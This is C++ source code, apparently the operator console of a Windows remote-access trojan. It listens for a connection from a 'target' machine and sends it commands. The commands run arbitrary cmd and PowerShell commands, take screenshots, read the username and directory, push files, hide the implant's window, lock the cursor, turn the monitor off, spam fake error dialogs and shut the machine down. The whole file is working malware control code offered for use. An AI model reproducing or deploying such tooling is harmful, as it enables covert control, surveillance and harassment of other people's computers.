#define SEND_BUFFER_SIZE 256
#define RECV_BUFFER_SIZE 4096
#define SEND_FAIL -1
#define RECV_FAIL -2
#define END_OF_MESSAGE 2
#define END_OF_LINE 1

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <sstream>
#include <string>
#include <forward_list>
#include <WS2tcpip.h>
#include <mswsock.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <unordered_map>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")

SOCKET clientsock;
SOCKET lissock;
bool quit = false;
bool goto_listen = false;
std::unordered_map<std::string, int(*)(const std::vector<std::string>& vec)> functions;
char buf[SEND_BUFFER_SIZE];
char recvbuf[RECV_BUFFER_SIZE];

using namespace std;

static std::string help_commands =
	"help - shows commands\n"
	"screenshot - takes screenshot from targets window!\n"
	"block_cursor - blocks targets cursor at cursor's current position\n"
	"unlock_cursor - only works if block cursor was called first!\n"
	"monitor_off - turns off targets monitor\n"
	"monitor_on - turns on targets monitor\n"
	"move_windows - gets targets active windows and moves them around their screen\n"
	"get_windows - gets all windows\n"
	"cmd command params... - executes a command at the target pc with no or with parameters\n"
	"self_hide - hides code::blocks and the console window\n"
	"self_show shows code::blocks and the console window\n"
	"send_text \"\" - sends text to targets console\n"
	"create_file file_name - creates a file at the targets pc with the specified name\n"
	"start_spam - starts spamming the target with fake error messages\n"
	"stop_spam - stops spamming the target with fake error messages\n"
	"close - closes the connection with the connected client\n"
	"exit - exits the application closes ingoing connections\n"
	"set_cursor_pos int x, int y - puts the cursor at the specified coordinates\n"
	"get_username - gets targets user\n";

enum COMMANDS
{
	EXIT = 0,
	SCREENSHOT = 1,
	BLOCKCURSOR = 2,
	UNLOCKCURSOR = 3,
	MONITOROFF = 4,
	MONITORON = 5,
	MOVEWINDOWS = 6,
	GETWINDOWS = 7,
	SELFHIDE = 8,
	SELFSHOW = 9,
	STARTSPAM = 10,
	STOPSPAM = 11,
	CREATEFILE = 12,
	SENDTEXT = 13,
	SETCURSORPOSITION = 14,
	NWODTUHS = 15,
	STOPMOVEWINDOW = 16,
	WHOAMI = 17,
	GETDIR = 18,
	CMD = 19,
	SENDFILE = 20,
	POWERSHELL = 21,
};

bool handle_send_fail()
{
	std::cerr << "Failed to send!" << std::endl;
	quit = true;
	return false;
}

bool handle_recv_fail()
{
	std::cerr << "Failed to recv!" << std::endl;
	quit = true;
	return false;
}

int _send()
{
	int result = send(clientsock, buf, SEND_BUFFER_SIZE, 0);
	if (result == SOCKET_ERROR)
		return SEND_FAIL;
	return 1;
}

int _recv()
{
	int result = recv(clientsock, recvbuf, 4096, 0);
	if (result == SOCKET_ERROR || result == 0)
		return RECV_FAIL;
	return 1;
}

int monitor_off(const std::vector<std::string>& args)
{
	buf[0] = MONITOROFF;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
	
}

int monitor_on(const std::vector<std::string>& args = {})
{
	buf[0] = MONITORON;
	
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int send_text(const std::vector<std::string>& args = {})
{
	std::string text = "";
	buf[0] = SENDTEXT;

	for (int i = 1; i < args.size(); ++i)
		text += args[i] + " ";

	memcpy(buf+1, text.c_str(), text.length()+1);

	if(_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int block_cursor(const std::vector<std::string>& args = {})
{
	buf[0] = BLOCKCURSOR;
	if(_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int unlock_cursor(const std::vector<std::string>& args = {})
{
	buf[0] = UNLOCKCURSOR;
	if(_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int move_windows(const std::vector<std::string>& args = {})
{
	buf[0] = MOVEWINDOWS;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int stop_move_windows(const std::vector<std::string>& args = {})
{
	buf[0] = STOPMOVEWINDOW;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int get_windows(const std::vector<std::string>& args = {})
{
	buf[0] = GETWINDOWS;

	if (_send() == SEND_FAIL)
		return handle_send_fail();
	if (_recv() == RECV_FAIL)
		return handle_recv_fail();

	std::cout << recvbuf << std::endl;

	return 1;
}

int self_hide(const std::vector<std::string>& args = {})
{
	buf[0] = SELFHIDE;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int self_show(const std::vector<std::string>& args = {})
{
	buf[0] = SELFSHOW;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return 1;
}

int start_spam(const std::vector<std::string>& args = {})
{
	buf[0] = STARTSPAM;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return true;
}

int stop_spam(const std::vector<std::string>& args = {})
{
	buf[0] = STOPSPAM;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return true;
}

int set_cursor_pos(const std::vector<std::string>& args = {})
{
	int pos[2];
	buf[0] = SETCURSORPOSITION;

	try
	{
		if (args.size() < 3)
			pos[0] = pos[1] = 0;
		else
		{
			pos[0] = std::stoi(args[1]);
			pos[1] = std::stoi(args[2]);
		}
	}
	catch (std::exception& e)
	{
		std::cerr << e.what() << std::endl;
		pos[0] = pos[1] = 0;
	}

	memcpy(&buf[1], pos, sizeof(pos));

	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return true;
}

int get_username(const std::vector<std::string>& args = {})
{
	buf[0] = WHOAMI;
	if(_send() == SEND_FAIL)
		return handle_send_fail();
	if(_recv() == RECV_FAIL)
		return handle_recv_fail();

	std::cout << (std::string)(recvbuf) << std::endl;

	return 1;
}

int get_current_directory(const std::vector<std::string>& args = {})
{
	buf[0] = GETDIR;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	if(_recv() == RECV_FAIL)
		return handle_recv_fail();
	std::cout << recvbuf << std::endl;
	return 1;
}

int help(const std::vector<std::string>& args = {})
{
	std::cout << help_commands;
	return 1;
}

int create_file(const std::vector<std::string>& args = {})
{
	buf[0] = CREATEFILE;
	int argc = args.size();

	if (argc == 1 || argc > 2)
	{
		std::cout << "create_file doesn't take " << argc << " arguments!" << std::endl;
		return 1;
	}

	memcpy(&buf[1], args[1].c_str(), sizeof(args[1]));
	if (_send() == SEND_FAIL)
		handle_send_fail();
	return 1;

}

int send_file(const std::vector<std::string>& args = {})
{
	int argc = args.size();
	if (argc != 2)
	{
		std::cout << "send_file doesn't take " << argc << " arguments!" << std::endl;
		return 1;
	}

	HANDLE file = CreateFileA(args[1].c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (file == INVALID_HANDLE_VALUE)
	{
		std::cout << "Failed to open " << args[1] << "!" << std::endl;
		return 1;
	}

	size_t file_size = GetFileSize(file, NULL), bytes_sent = 0, bytes_to_send, to_send;

	buf[0] = SENDFILE;
	memcpy(buf + 1, &file_size, sizeof(file_size));
	memcpy(buf + 1 + sizeof(file_size), args[1].c_str(), args[1].length() + 1);

	if (_send() == SEND_FAIL)
		return handle_send_fail();

	OVERLAPPED offset;
	memset(&offset, 0, sizeof(offset));
	
	if (TransmitFile(clientsock, file, 0, 0, 0, 0, 0) == FALSE)
		std::cout << "Failed to send file!" << std::endl;
	else
		std::cout << "Sucessfully sent packet!" << std::endl;
	CloseHandle(file);

	return 1;
}

int shutdown(const std::vector<std::string>& args = {})
{
	buf[0] = NWODTUHS;
	if (_send() == SEND_FAIL)
		return handle_send_fail();
	return true;
}

int close(const std::vector<std::string>& args = {})
{
	shutdown(clientsock, SD_BOTH);
	closesocket(clientsock);
	quit = true;
	goto_listen = true;
	return 2;
}

int _exit(const std::vector<std::string>& args = {})
{
	if (clientsock)
		close();
	quit = true;
	goto_listen = false;
	return true;
}

int cmd(const std::vector<std::string>& args = {})
{
	if (args.size() == 1)
		return 1;

	buf[0] = CMD;
	size_t length = 1;

	for (int i = 1; i < args.size(); ++i)
	{
		memcpy(buf + length, args[i].c_str(), args[i].length() + 1);
		length += args[i].length();
		buf[length++] = ' ';
	}

	buf[length] = '\0';

	std::cout << buf+1 << std::endl;

	if (_send() == SEND_FAIL)
		return handle_send_fail();

	while (recvbuf[0] != END_OF_MESSAGE)
	{
		ZeroMemory(&recvbuf, RECV_BUFFER_SIZE);
		if (_recv() == RECV_FAIL)
			return handle_recv_fail();
		std::cout << recvbuf + 1;
	}

	return 1;
}

int powershell(const std::vector<std::string>& args = {})
{
	if (args.size() == 1)
		return 1;
	size_t length = 1;

	for (int i = 1; i < args.size(); ++i)
	{
		memcpy(buf + length, args[i].c_str(), args[i].length() + 1);
		length += args[i].length();
		buf[length++] = ' ';
	}

	buf[length] = '\0';

	buf[0] = POWERSHELL;

	if (_send() == SEND_FAIL)
		return handle_send_fail();

	while (recvbuf[0] != END_OF_MESSAGE)
	{
		ZeroMemory(&recvbuf, RECV_BUFFER_SIZE);
		if (_recv() == RECV_FAIL)
			return handle_recv_fail();
		std::cout << recvbuf+1;
	}

	return 1;
}

void init_functions()
{
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"exit", &_exit));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"close", &close));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"shutdown", &shutdown));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"send_file", &send_file));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"create_file", &create_file));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"help", &help));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"dir", &get_current_directory));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"get_username", &get_username));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"whoami", &get_username));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"stop_spam", &stop_spam));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"start_spam", &start_spam));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"self_hide", &self_hide));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"self_show", &self_show));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"move_windows", &move_windows));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"stop_move_windows", &stop_move_windows));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"block_cursor", &block_cursor));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"unlock_cursor", &unlock_cursor));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"monitor_off", &monitor_off));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"monitor_on", &monitor_on));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"send_text", &send_text));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"set_cursor_pos", &set_cursor_pos));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"cmd", &cmd));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"get_windows", &get_windows));
	functions.insert(std::make_pair<std::string, int(*)(const std::vector<std::string>&)>((std::string)"powershell", &powershell));
}

int execute_command(const std::vector<std::string>& args)
{
    ZeroMemory(&buf, SEND_BUFFER_SIZE);
    ZeroMemory(&recvbuf, RECV_BUFFER_SIZE);
    int res = functions[args[0]](args);
    if (res == 1)
        return 1;
    else if (res == 2)
        return 2;
    return 0;
}


bool find_command(std::string input)
{
    if (input.find_first_not_of(' ') != std::string::npos)
    {
        std::vector<std::string> args;
        std::stringstream s(input);

        while (s >> input)
            args.push_back(input);
        if (functions.find(args[0]) != functions.end())
        {
            if (!execute_command(args))
            {
                std::cerr << "Execute command failed!" << std::endl;
                quit = true;
                goto_listen = true;
            }
        }
        else
            std::cerr << "No command named: \"" << args[0] << "\"!" << std::endl;
    }
    return false;
}


int main()
{
    init_functions();
    int bytesrecv, size, on = 0;
    string input;
    char host[1024];
    char service[1024];
    sockaddr_in client;

    memset(host, 0, 1024);
    memset(service, 0, 1024);
    memset(&client, 0, sizeof(client));
    string ip = "193.161.193.99";

    cout << ip << endl;

    WSADATA wsadata;

    if (WSAStartup(MAKEWORD(2, 2), &wsadata))
    {
        wcout << L"Failed to make socket!" << endl;
        system("pause");
        exit(-1);
    }

    lissock = socket(AF_INET, SOCK_STREAM, 0);

    if (lissock == INVALID_SOCKET)
    {
        wcout << L"Nemoze da se napravi socket" << endl;
        system("pause");
        exit(-1);
    }

    if (setsockopt(lissock, SOL_SOCKET, SO_REUSEADDR, (const char*)&on, sizeof(on)))
    {
        wcout << L"Failed to set socket options!" << endl;
        system("pause");
        exit(-1);
    }

    sockaddr_in hint;
    hint.sin_port = htons(3500); //port za slusaqe
    hint.sin_addr.S_un.S_addr = INADDR_ANY;
    hint.sin_family = AF_INET;

    bind(lissock, (sockaddr*)&hint, sizeof(hint));

    listen(lissock, SOMAXCONN);

listen_mode:
    memset(&client, 0, sizeof(client));

    wcout << L"Listening!" << endl;

    size = sizeof(client);

    clientsock = accept(lissock, (sockaddr*)&client, &size);

    if (clientsock == INVALID_SOCKET)
    {
        cout << L"Failed to connect to client!" << endl;
        system("pause");
        exit(-1);
    }

    if (!getnameinfo((sockaddr*)&client, sizeof(client), host, 1024, service, 1024, 0))
    {
        cout << inet_ntoa(client.sin_addr) << " " << host << " Connected on port: " << service << endl;
    }
    else
    {
        //inet_ntop(AF_INET, &client.sin_addr, host, 1024);
        cout << inet_ntoa(client.sin_addr) << " " << host << " Connected on port: " << ntohs(client.sin_port) << endl;
    }

    cout << "\n\n";

    while (!quit)
    {
        cout << ">> ";

        getline(cin, input);
        find_command(input);
    }

    if (goto_listen)
    {
        quit = false;
        goto listen_mode;
    }

    if (clientsock != INVALID_SOCKET)
        closesocket(clientsock);
    closesocket(lissock);
    WSACleanup();

    return 0;
}
